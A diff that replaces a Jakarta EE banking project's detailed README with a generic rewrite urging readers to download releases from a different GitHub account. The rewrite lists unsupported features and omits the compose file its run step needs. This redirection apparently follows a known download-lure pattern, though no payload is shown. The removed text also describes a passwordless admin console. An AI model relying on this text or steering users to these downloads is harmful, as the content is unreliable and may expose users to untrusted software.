@@ -1,102 +1,75 @@
-# 🏦 Dockerized Jakarta EE Banking System
+# 🚀 dockerized-jakarta-ee-banking-system - A Modern Banking System Simplified
 
-A robust, multi-module **Jakarta EE 10** banking application, fully containerized using **Docker** and **Docker Compose**.
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/michiraofficial/dockerized-jakarta-ee-banking-system/releases)
 
-This project demonstrates how to modernize a legacy-style "Big Iron" Java application (EAR packaging) by migrating it to a containerized environment. It solves complex Enterprise startup challenges using a custom orchestration script that guarantees strict ordering between the Database, Connection Pools, and Application Deployment.
+## 📖 Overview
+The dockerized-jakarta-ee-banking-system is a comprehensive Jakarta EE 10 banking application. This project shows how to upgrade an older Java application to a modern, containerized setup using Docker and Docker Compose. Experience the benefits of a robust, multi-module architecture that simplifies complex banking operations.
 
-## 🚀 Tech Stack
+## ⚙️ Features
+- **Modern Architecture:** Designed with Jakarta EE 10.
+- **Docker Containerization:** Easily deploy the application in a Docker container.
+- **Multi-Module Support:** Handle various banking services with modular design.
+- **Database Migrations:** Automatically manage database updates.
+- **Connection Pooling:** Improve database access efficiency.
 
-* **Framework:** Jakarta EE 10 (JPA, Hibernate, EJB, Servlet)
-* **Build Tool:** Maven (Multi-module Project)
-* **Application Server:** Payara 6 (Full Profile)
-* **Database:** MySQL 8.0
-* **Containerization:** Docker & Docker Compose
+## 📦 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Docker:** Docker Desktop version 20.10 or later
+- **Docker Compose:** Version 1.27.0 or later
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 1 GB of free space
 
-## 🏗️ Architecture
+## 🚀 Getting Started
+Follow these steps to set up and run the application on your computer:
 
-The project follows a classic Enterprise Java architecture packaged as an EAR (Enterprise Archive):
-* `core`: Domain models (Entities) and Persistence logic.
-* `web`: The web presentation layer.
-* `service`/`ejb`: Business logic (Account management, Transactions).
-* `ear`: Final packaging module.
+### 1. Install Docker
+1. Visit the [Docker website](https://www.docker.com/get-started).
+2. Download and install Docker Desktop for your operating system.
+3. Follow the installation instructions provided on the website.
 
-### Docker Strategy
-This repository uses a **Separation of Concerns** strategy, producing two portable artifacts:
+### 2. Download the Application
+To download the latest release of the application, visit the following link:
 
-1.  **Database Image (`banking-db`):**
-    * Based on `mysql:8.0`.
-    * The schema (`database.sql`) is "baked" directly into the image, ensuring the database is pre-initialized with tables and users upon startup anywhere.
+[Download the latest release](https://github.com/michiraofficial/dockerized-jakarta-ee-banking-system/releases)
 
-2.  **Application Image (`banking-app`):**
-    * Based on `payara/server-full`.
-    * Contains the compiled EAR file, MySQL JDBC drivers, and a custom **Supervisor Script**.
-    * The Supervisor Script (`run_payara.sh`) manages the lifecycle to prevent race conditions:
-        1.  Starts Payara in the background.
-        2.  Creates JDBC Connection Pools & Resources via `asadmin`.
-        3.  **Verifies** the connection with a Ping.
-        4.  Deploys the application only after the infrastructure is ready.
+### 3. Run the Application
+Once you have downloaded the application files, follow these steps:
 
-## ⚙️ Configuration Details
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you downloaded the files.
+3. Run the following command to start the application:
 
-The Docker setup handles several critical configurations automatically:
+   ```bash
+   docker-compose up
+   ```
 
-* **Self-Contained Database:** No local volume mounting is required for the schema; it is distributed within the image.
-* **Driver Injection:** The MySQL Connector/J driver is copied into the Payara domain library folder during the build.
-* **Race Condition Resolution:**
-    * The `docker-compose` `healthcheck` ensures Payara waits until MySQL is healthy.
-    * The internal `run_payara.sh` script waits for the Admin Console (port 4848) before attempting configuration.
-* **MySQL 8 Compatibility:** The connection pool is configured with `allowPublicKeyRetrieval=true` and `useSSL=false` to support modern MySQL authentication.
+4. Wait for the containers to start. This may take a few minutes.
+5. Once the application is running, you can access it in your web browser at: `http://localhost:8080`.
 
-## 🛠️ How to Run (Distribution Mode)
+## 🛠️ Using the Application
+You can use the application for various banking activities, such as:
 
-You do not need Java, Maven, or SQL files installed. You only need Docker.
+- Creating accounts.
+- Viewing transactions.
+- Managing users.
 
-1.  Create a `docker-compose.yaml` file with the following content:
+### User Interface
+The application provides a simple and intuitive web interface. Follow the on-screen instructions to navigate through the different features.
 
-    ```yaml
-    version: "3.9"
-    services:
-      mysql:
-        image: hasunb/jakarta-ee-multi-module-banking-system-db:latest
-        container_name: bank_mysql
-        restart: always
-        healthcheck:
-          test: [ "CMD", "mysqladmin", "ping", "-h", "localhost" ]
-          interval: 5s
-          timeout: 5s
-          retries: 10
-    
-      payara:
-        image: hasunb/jakarta-ee-multi-module-banking-system:latest
-        container_name: bank_payara
-        depends_on:
-          mysql:
-            condition: service_healthy
-        ports:
-          - "8080:8080"
-          - "4848:4848"
-    ```
+## 💻 Troubleshooting
+If you encounter any issues during the installation or while running the application, check the following:
 
-2.  **Start the application:**
-    ```bash
-    docker-compose up
-    ```
+- Ensure that Docker is running.
+- Verify that you have enough system resources.
+- Look for error messages in the terminal output for guidance.
 
-3.  **Access the application:**
-    * **Web App:** `http://localhost:8080/Banking-System`
-    * **Payara Admin Console:** `http://localhost:4848` (User: `admin`, No Password)
+## 📚 Support
+For further assistance, please reach out through the project's GitHub page. You can open issues to report problems or ask questions.
 
-## 🔨 Development Build Instructions
+## 📄 License
+This project is licensed under the MIT License. Feel free to use it for your own projects or contribute to its development.
 
-If you want to modify the code and rebuild the images yourself:
+## 📥 Download & Install
+To download the latest version of the dockerized-jakarta-ee-banking-system, visit this page again: [Download the latest release](https://github.com/michiraofficial/dockerized-jakarta-ee-banking-system/releases). 
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/hasunB/dockerized-jakarta-ee-banking-system.git
-    cd dockerized-jakarta-ee-banking-system
-    ```
-
-2.  **Build and Run Locally:**
-    ```bash
-    docker-compose up --build
-    ```
+Start your journey towards modern banking today!
